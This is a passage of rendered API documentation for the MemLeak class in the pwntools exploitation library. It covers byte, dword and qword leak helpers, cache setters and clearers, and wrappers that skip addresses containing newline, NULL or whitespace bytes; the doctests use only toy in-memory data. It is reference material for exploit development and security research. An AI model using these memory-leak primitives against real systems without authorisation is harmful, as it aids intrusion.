<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">memory</span> <span class="o">=</span> <span class="p">{</span><span class="o">-</span><span class="mi">4</span><span class="o">+</span><span class="n">i</span><span class="p">:</span> <span class="n">c</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="s1">&#39;wxyzABCDE&#39;</span><span class="p">)}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">relative_leak</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
<span class="gp">... </span>    <span class="k">return</span> <span class="n">memory</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">leak</span> <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">memleak</span><span class="o">.</span><span class="n">MemLeak</span><span class="p">(</span><span class="n">relative_leak</span><span class="p">,</span> <span class="n">relative</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">leak</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
<span class="go">&#39;zAB&#39;</span>
</pre></div>
</div>
<dl class="staticmethod">
<dt id="pwnlib.memleak.MemLeak.NoNewlines">
<em class="property">static </em><code class="descname">NoNewlines</code><span class="sig-paren">(</span><em>function</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L584-600"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.NoNewlines" title="Permalink to this definition">¶</a></dt>
<dd><p>Wrapper for leak functions such that addresses which contain newline
bytes are not leaked.</p>
<p>This is useful if the address which is used for the leak is provided by
e.g. <code class="docutils literal"><span class="pre">fgets()</span></code>.</p>
</dd></dl>

<dl class="staticmethod">
<dt id="pwnlib.memleak.MemLeak.NoNulls">
<em class="property">static </em><code class="descname">NoNulls</code><span class="sig-paren">(</span><em>function</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L548-564"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.NoNulls" title="Permalink to this definition">¶</a></dt>
<dd><p>Wrapper for leak functions such that addresses which contain NULL
bytes are not leaked.</p>
<p>This is useful if the address which is used for the leak is read in via
a string-reading function like <code class="docutils literal"><span class="pre">scanf(&quot;%s&quot;)</span></code> or smilar.</p>
</dd></dl>

<dl class="staticmethod">
<dt id="pwnlib.memleak.MemLeak.NoWhitespace">
<em class="property">static </em><code class="descname">NoWhitespace</code><span class="sig-paren">(</span><em>function</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L566-582"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.NoWhitespace" title="Permalink to this definition">¶</a></dt>
<dd><p>Wrapper for leak functions such that addresses which contain whitespace
bytes are not leaked.</p>
<p>This is useful if the address which is used for the leak is read in via
e.g. <code class="docutils literal"><span class="pre">scanf()</span></code>.</p>
</dd></dl>

<dl class="staticmethod">
<dt id="pwnlib.memleak.MemLeak.String">
<em class="property">static </em><code class="descname">String</code><span class="sig-paren">(</span><em>function</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L602-618"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.String" title="Permalink to this definition">¶</a></dt>
<dd><p>Wrapper for leak functions which leak strings, such that a NULL
terminator is automaticall added.</p>
<p>This is useful if the data leaked is printed out as a NULL-terminated
string, via e.g. <code class="docutils literal"><span class="pre">printf()</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.b">
<code class="descname">b</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx = 0</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L234-251"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.b" title="Permalink to this definition">¶</a></dt>
<dd><p>Leak byte at <code class="docutils literal"><span class="pre">((uint8_t*)</span> <span class="pre">addr)[ndx]</span></code></p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span> <span class="n">reraise</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">b</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">b</span><span class="p">(</span><span class="mi">25</span><span class="p">)</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">b</span><span class="p">(</span><span class="mi">26</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.clearb">
<code class="descname">clearb</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx = 0</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L382-401"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.clearb" title="Permalink to this definition">¶</a></dt>
<dd><p>Clears byte at <code class="docutils literal"><span class="pre">((uint8_t*)addr)[ndx]</span></code> from the cache and
returns the removed value or <cite>None</cite> if the address was not completely set.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="kc">None</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="s1">&#39;a&#39;</span><span class="p">}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">n</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;a&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">clearb</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span>
<span class="go">{}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">clearb</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.cleard">
<code class="descname">cleard</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx = 0</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L422-439"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.cleard" title="Permalink to this definition">¶</a></dt>
<dd><p>Clears dword at <code class="docutils literal"><span class="pre">((uint32_t*)addr)[ndx]</span></code> from the cache and
returns the removed value or <cite>None</cite> if the address was not completely set.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="kc">None</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">:</span> <span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span> <span class="s1">&#39;d&#39;</span><span class="p">}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">n</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;abcd&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cleard</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;abcd&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span>
<span class="go">{}</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.clearq">
<code class="descname">clearq</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx = 0</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L441-456"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.clearq" title="Permalink to this definition">¶</a></dt>
<dd><p>Clears qword at <code class="docutils literal"><span class="pre">((uint64_t*)addr)[ndx]</span></code> from the cache and
returns the removed value or <cite>None</cite> if the address was not completely set.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">c</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">addr</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span><span class="o">.</span><span class="n">cache</span> <span class="o">=</span> <span class="p">{</span><span class="n">x</span><span class="p">:</span><span class="s1">&#39;x&#39;</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="mh">0x108</span><span class="p">)}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span><span class="o">.</span><span class="n">clearq</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;xxxxxxxx&#39;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">c</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{}</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.clearw">
<code class="descname">clearw</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx = 0</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L403-420"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.clearw" title="Permalink to this definition">¶</a></dt>
<dd><p>Clears word at <code class="docutils literal"><span class="pre">((uint16_t*)addr)[ndx]</span></code> from the cache and
returns the removed value or <cite>None</cite> if the address was not completely set.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="kc">None</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">:</span> <span class="s1">&#39;b&#39;</span><span class="p">}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">n</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;ab&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">clearw</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;ab&#39;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span>
<span class="go">{}</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.d">
<code class="descname">d</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx = 0</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L272-289"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.d" title="Permalink to this definition">¶</a></dt>
<dd><p>Leak dword at <code class="docutils literal"><span class="pre">((uint32_t*)</span> <span class="pre">addr)[ndx]</span></code></p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="n">reraise</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">d</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;abcd&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">d</span><span class="p">(</span><span class="mi">22</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;wxyz&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">d</span><span class="p">(</span><span class="mi">23</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.field">
<code class="descname">field</code><span class="sig-paren">(</span><em>address</em>, <em>obj</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L126-144"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.field" title="Permalink to this definition">¶</a></dt>
<dd><p>field(address, field) =&gt; a structure field.</p>
<p>Leak a field from a structure.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Base address to calculate offsets from</li>
<li><strong>field</strong> (<em>obj</em>) &#8211; Instance of a ctypes field</li>
</ul>
</td>
</tr>
</tbody>
</table>
<dl class="docutils">
<dt>Return Value:</dt>
<dd>The type of the return value will be dictated by
the type of <code class="docutils literal"><span class="pre">field</span></code>.</dd>
</dl>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.field_compare">
<code class="descname">field_compare</code><span class="sig-paren">(</span><em>address</em>, <em>obj</em>, <em>expected</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L146-169"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.field_compare" title="Permalink to this definition">¶</a></dt>
<dd><p>field_compare(address, field, expected) ==&gt; bool</p>
<p>Leak a field from a structure, with an expected value.
As soon as any mismatch is found, stop leaking the structure.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Base address to calculate offsets from</li>
<li><strong>field</strong> (<em>obj</em>) &#8211; Instance of a ctypes field</li>
<li><strong>expected</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Expected value</li>
</ul>
</td>
</tr>
</tbody>
</table>
<dl class="docutils">
<dt>Return Value:</dt>
<dd>The type of the return value will be dictated by
the type of <code class="docutils literal"><span class="pre">field</span></code>.</dd>
</dl>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.n">
<code class="descname">n</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx = 0</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L348-370"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.n" title="Permalink to this definition">¶</a></dt>
<dd><p>Leak <cite>numb</cite> bytes at <cite>addr</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">A string with the leaked bytes, will return <cite>None</cite> if any are missing</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">reraise</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">n</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;a&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">n</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">26</span><span class="p">)</span> <span class="o">==</span> <span class="n">data</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">len</span><span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">n</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">26</span><span class="p">))</span> <span class="o">==</span> <span class="mi">26</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">n</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">27</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.p">
<code class="descname">p</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx = 0</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L310-315"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.p" title="Permalink to this definition">¶</a></dt>
<dd><p>Leak a pointer-width value at <code class="docutils literal"><span class="pre">((void**)</span> <span class="pre">addr)[ndx]</span></code></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.p16">
<code class="descname">p16</code><span class="sig-paren">(</span><em>addr</em>, <em>val</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L478-490"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.p16" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets word at <code class="docutils literal"><span class="pre">((uint16_t*)addr)[ndx]</span></code> to <cite>val</cite> in the cache.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{}</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">setw</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{</span><span class="mi">33</span><span class="p">:</span> <span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="mi">34</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">}</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.p32">
<code class="descname">p32</code><span class="sig-paren">(</span><em>addr</em>, <em>val</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L492-498"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.p32" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets dword at <code class="docutils literal"><span class="pre">((uint32_t*)addr)[ndx]</span></code> to <cite>val</cite> in the cache.</p>
<p class="rubric">Examples</p>
<p>See <a class="reference internal" href="#pwnlib.memleak.MemLeak.setw" title="pwnlib.memleak.MemLeak.setw"><code class="xref py py-meth docutils literal"><span class="pre">setw()</span></code></a>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.p64">
<code class="descname">p64</code><span class="sig-paren">(</span><em>addr</em>, <em>val</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L500-506"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.p64" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets qword at <code class="docutils literal"><span class="pre">((uint64_t*)addr)[ndx]</span></code> to <cite>val</cite> in the cache.</p>
<p class="rubric">Examples</p>
<p>See <a class="reference internal" href="#pwnlib.memleak.MemLeak.setw" title="pwnlib.memleak.MemLeak.setw"><code class="xref py py-meth docutils literal"><span class="pre">setw()</span></code></a>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.p8">
<code class="descname">p8</code><span class="sig-paren">(</span><em>addr</em>, <em>val</em>, <em>ndx=0</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L464-476"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.p8" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets byte at <code class="docutils literal"><span class="pre">((uint8_t*)addr)[ndx]</span></code> to <cite>val</cite> in the cache.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{}</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">setb</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">cache</span> <span class="o">==</span> <span class="p">{</span><span class="mi">33</span><span class="p">:</span> <span class="s1">&#39;A&#39;</span><span class="p">}</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.q">
<code class="descname">q</code><span class="sig-paren">(</span><em>addr</em>, <em>ndx = 0</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/memleak.py#L291-308"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.memleak.MemLeak.q" title="Permalink to this definition">¶</a></dt>
<dd><p>Leak qword at <code class="docutils literal"><span class="pre">((uint64_t*)</span> <span class="pre">addr)[ndx]</span></code></p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">data</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">MemLeak</span><span class="p">(</span><span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">data</span><span class="p">[</span><span class="n">a</span><span class="p">:</span><span class="n">a</span><span class="o">+</span><span class="mi">16</span><span class="p">],</span> <span class="n">reraise</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;abcdefgh&#39;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">q</span><span class="p">(</span><span class="mi">18</span><span class="p">)</span> <span class="o">==</span> <span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;stuvwxyz&#39;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span><span class="o">.</span><span class="n">q</span><span class="p">(</span><span class="mi">19</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.memleak.MemLeak.raw">
